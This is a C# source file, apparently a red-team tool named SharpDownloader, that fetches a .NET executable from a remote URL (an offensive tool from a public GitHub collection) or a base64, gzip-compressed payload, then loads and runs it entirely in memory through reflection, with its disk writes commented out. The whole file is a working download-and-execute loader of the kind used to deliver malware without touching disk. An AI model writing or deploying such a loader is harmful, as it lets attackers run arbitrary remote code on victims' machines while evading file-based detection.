using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.IO.Compression;

namespace AssemblyLoader;

public class SharpDownloader
{
    public static async Task Main(string[] args)
    {
        string _url = "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.0_Any/SharpDir.exe";
        await GetAndExecute(_url);
        //string _url = "{Created With Compress-CSharp-Exe-For-PowerShell.ps1}";
        //await GetCompressedAndExecute(_url);
    }

    public static async Task GetAndExecute(string _url)
    {
        HttpClient client = new HttpClient();
        HttpResponseMessage response = await client.GetAsync(_url);
        response.EnsureSuccessStatusCode();
        Byte[] bytes = await response.Content.ReadAsByteArrayAsync();
        //File.WriteAllBytes("outputStream.exe", bytes);
        ExecuteAssembly(bytes, new string[] { ".", "*.exe" });
    }

    public static async Task GetCompressedAndExecute(string _url)
    {
        HttpClient client = new HttpClient();
        HttpResponseMessage response = await client.GetAsync(_url);
        response.EnsureSuccessStatusCode();
        string responseBody = await response.Content.ReadAsStringAsync();
        Byte[] bytes = Convert.FromBase64String(responseBody);
        using(MemoryStream memStream = new MemoryStream(bytes.Length))
        {
            memStream.Write(bytes, 0 , bytes.Length);
            memStream.Seek(0, SeekOrigin.Begin);
            var outputStream = new MemoryStream();
            using var zipStream = new GZipStream(memStream, CompressionMode.Decompress, false);
            {
                await zipStream.CopyToAsync(outputStream);
                //File.WriteAllBytes("outputStream.exe", outputStream.ToArray());
                ExecuteAssembly(outputStream.ToArray(), new string[] { ".", "*.exe" });
            }
        } 
    }

    public static void ExecuteAssembly(Byte[] assemblyBytes, string[] param)
    {
        Assembly assembly = Assembly.Load(assemblyBytes);
        MethodInfo method = assembly.EntryPoint;
        object[] parameters = new[] { param };
        object execute = method.Invoke(null, parameters);
    }
}
